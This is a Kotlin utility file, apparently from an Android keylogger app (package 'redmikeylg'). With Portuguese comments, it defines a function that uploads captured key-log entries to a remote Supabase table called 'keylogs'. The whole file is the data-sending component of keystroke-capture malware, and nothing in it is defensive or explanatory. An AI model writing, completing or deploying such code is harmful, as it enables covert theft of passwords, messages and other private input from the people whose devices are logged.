package com.seuempresa.redmikeylg.utils

import com.seuempresa.redmikeylg.data.KeyLogEntry
import io.github.jan.supabase.SupabaseClient
import io.github.jan.supabase.postgrest.postgrest

/**
 * Extensões e utilitários para operações com o cliente Supabase.
 */
object SupabaseExtensions {

    /**
     * Insere um registro [KeyLogEntry] na tabela "keylogs" do Supabase.
     *
     * @param client Instância do cliente Supabase (por padrão usa [SupabaseClientProvider.client]).
     * @param log Instância contendo os dados do log capturado.
     */
    suspend fun insertKeyLog(
        log: KeyLogEntry,
        client: SupabaseClient = SupabaseClientProvider.client
    ) {
        client.postgrest["keylogs"].insert(log)
    }
}
